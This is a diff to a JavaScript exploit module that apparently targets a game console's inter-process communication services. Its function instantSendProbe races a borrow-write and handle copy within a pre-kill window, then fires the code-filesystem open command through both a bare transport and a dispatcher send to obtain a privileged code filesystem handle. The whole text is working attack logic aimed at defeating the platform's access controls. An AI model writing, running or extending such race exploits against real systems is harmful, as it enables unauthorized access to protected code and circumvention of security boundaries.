@@ -16,7 +16,7 @@ import {readFs, writeFs} from "./endpoint.mjs";
 import {cmifSend, bareSendTransport, buildCmif, oneMovedHandle}
     from "./wire.mjs";
 
-const {cmifReply} = runtime;
+const {cmifReply, sendIPC} = runtime;
 
 export async function instantSendProbe(context, title) {
     const owned = context.inspectionDomain;
@@ -37,7 +37,8 @@ export async function instantSendProbe(context, title) {
         input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
         b: [{addr: info + 32n, size: 0x1a4}]});
 
-    // The race: borrow-write (1 IPC), copy (1 IPC), send (direct svc).
+    // The race: borrow-write (1 IPC), copy (1 IPC), then the transport
+    // battery — every send fires within the pre-kill window (~5-400ms).
     await writeFs(context, entry20, borrowPair);
     let copyHandle = 0;
     try {
@@ -49,19 +50,44 @@ export async function instantSendProbe(context, title) {
         const copyRc = reply.transport;
         if (copyRc === 0 && reply.moves && reply.moves.length)
             copyHandle = track(context, reply.moves[0], "is-copy");
-        const sendRc = copyHandle ? bareSendTransport(copyHandle, slots.pkt)
-            : 0xF601;
-        await khLog("IS1 instant send copy=" + hex(copyRc) +
-            " send=" + hex(sendRc) + " handle=" + hex(copyHandle));
-        if (sendRc === 0) {
-            const parsed = cmifReply(slots.pkt);
-            await khLog("IS2 ***LIVED*** result=" + hex(parsed.result) +
-                " moves=" + (parsed.moves ? parsed.moves.length : 0) +
-                " copies=" + (parsed.copies ? parsed.copies.length : 0));
-            if (parsed.result === 0 && parsed.moves && parsed.moves.length) {
-                context.instantCodeFs = track(context, parsed.moves[0],
-                    "is-codefs");
-                await khLog("IS3 code fs handle=" + hex(context.instantCodeFs));
+        await khLog("IS1 copy rc=" + hex(copyRc) +
+            " handle=" + hex(copyHandle));
+        if (copyHandle) {
+            // Trivial command (1 = IsArchivedProgram: u64 in, u8 out, no
+            // descriptors) through both transports, then the code-open
+            // through both. 0xE801 on the bare path with valid packets
+            // points at a session-type/transport mismatch; if the
+            // dispatcher transports 0, the port just needs the right send.
+            buildCmif(slots.pkt2, {cmd: 1, input: u64Bytes(0x10n)});
+            const t1 = bareSendTransport(copyHandle, slots.pkt2);
+            buildCmif(slots.pkt2, {cmd: 1, input: u64Bytes(0x10n)});
+            const d1 = Number(sendIPC(copyHandle, slots.pkt2)) >>> 0;
+            let r1 = "-";
+            if (d1 === 0) r1 = hex(cmifReply(slots.pkt2).result);
+            await khLog("IS2 trivial bare=" + hex(t1) +
+                " dispatcher=" + hex(d1) + " result=" + r1);
+            buildCmif(slots.pkt, {cmd: 0,
+                input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
+                b: [{addr: info + 32n, size: 0x1a4}]});
+            const t2 = bareSendTransport(copyHandle, slots.pkt);
+            buildCmif(slots.pkt, {cmd: 0,
+                input: [1, 3, 0, 0, 0, 0, 0, 0].concat(u64Bytes(BigInt(title))),
+                b: [{addr: info + 32n, size: 0x1a4}]});
+            const d2 = Number(sendIPC(copyHandle, slots.pkt)) >>> 0;
+            await khLog("IS3 code-open bare=" + hex(t2) +
+                " dispatcher=" + hex(d2));
+            for (const [tag, pktBuf, rc] of [["bare", slots.pkt, t2],
+                    ["disp", slots.pkt, d2]]) {
+                if (rc !== 0) continue;
+                const parsed = cmifReply(pktBuf);
+                await khLog("IS4 " + tag + " result=" + hex(parsed.result) +
+                    " moves=" + (parsed.moves ? parsed.moves.length : 0));
+                if (parsed.result === 0 && parsed.moves && parsed.moves.length) {
+                    context.instantCodeFs = track(context, parsed.moves[0],
+                        "is-codefs");
+                    await khLog("IS5 ***CODE FS OPEN*** handle=" +
+                        hex(context.instantCodeFs));
+                }
             }
         }
     } finally {
